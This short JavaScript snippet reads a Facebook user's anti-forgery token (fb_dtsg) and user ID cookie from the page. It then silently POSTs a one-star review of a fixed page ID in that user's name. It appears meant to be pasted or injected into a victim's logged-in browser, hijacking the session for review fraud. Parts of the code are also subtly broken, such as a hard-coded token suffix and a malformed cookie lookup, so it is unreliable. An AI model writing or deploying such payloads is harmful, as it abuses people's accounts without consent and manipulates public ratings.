  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/pages/review/add?mechanism=inline_rating&send_reviews_feed_markup=1&__pc=EXP1%3ADEFAULT";
  var XParams = "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"%3AAQHw-nU4gS90&id=1028127337249145&ref=page_review_tab&id_to_replace=&source=11&rating=1&note_message=&audience[8787770733][value]=80&done_button=1&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&ttstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
